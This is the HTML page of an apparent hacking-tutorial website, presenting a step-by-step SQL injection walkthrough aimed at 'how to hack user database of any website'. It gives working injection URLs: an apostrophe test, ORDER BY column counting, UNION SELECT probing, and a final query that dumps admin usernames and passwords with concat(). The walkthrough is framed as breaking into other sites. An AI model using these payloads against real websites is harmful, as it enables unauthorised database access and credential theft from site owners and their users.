<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>SQL Injection</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="How to hack user database of any website" />
	<meta name="keywords" content="How to hack user database of any website" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433839389" rel="stylesheet" type="text/css" />
	<link href="css/44.css?ts=1433839389" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance1572" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance1573" class="wb_element"><div></div></div><div id="wb_element_instance1574" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div><div id="wb_element_instance1578" class="wb_element"><a class="wb_button" href=""><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance1575" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance1576" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance1579" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1">SQL INJECTION</h1>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Now we are going to learn how to hack the sites which is vulnerable to Sql injection.So lets begin</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">To check if the site is vulnerable to Sql injection first check the url if it is like this</p>

<p class="wb-stl-normal">www.site.com/file.php?id=7</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">To check the vulnerbility type appostrophy at the end of url so it will become like this</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">www.site.com/file.php?id=7'</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">On hitting enter if you see this text on page</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Then the website is vulnerable to this attack</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<h2 class="wb-stl-heading2">FINDING THE COLUMNS</h2>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">To find number of columns we use statement ORDER BY (tells database how to order the result). In order to use, we do increment until we get an error.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 order by 1 -- no error</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 order by 2 -- no error</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 order by 3 – error</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">so it means the site has 2 columns because we got error on 3th one.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<h3 class="wb-stl-heading3">CHECKING FOR UNION FUNCTION</h3>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Our next is step is to check for union function. This is because with union function we can select more data in one statement only.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 union all select 1,2</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Till 2 because we discoverd the no of column was 2 so lets move on</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">If we see some numbers on screen, i.e. 1 or 2  that means the UNION works</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<h3 class="wb-stl-heading3">GETTING TABLE AND COLUMN NAME</h3>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">This is for MySQL version less than 5</p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 union all select 1,2,3 from admin</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">We see number 2 on the screen like before. Now we know that table admin exists. Now to check column names we craft a query</p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 union all select 1,2,username from admin</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">We get username displayed on screen</p>

<p class="wb-stl-normal">Now to check for the column password</p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 union all select 1,2,password from admin</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">If we got successful, we will see password on the screen. It can be in plain text or hash depending on how the database has been setup ?. Now we must complete the query. For that we can use concat() function (it joins strings</p>

<p class="wb-stl-normal">http://www.site.com/news.php?id=7 union all select 1,2,concat(username,0x3a,password)from admin</p>

<p class="wb-stl-normal">Note that we put 0x3a, its hex value for so 0x3a is hex value for colon</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Now we get displayed username: password on screen</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>
</div><div id="wb_element_instance1580" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(44);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance1580");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance1580").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance1577" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance1581" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>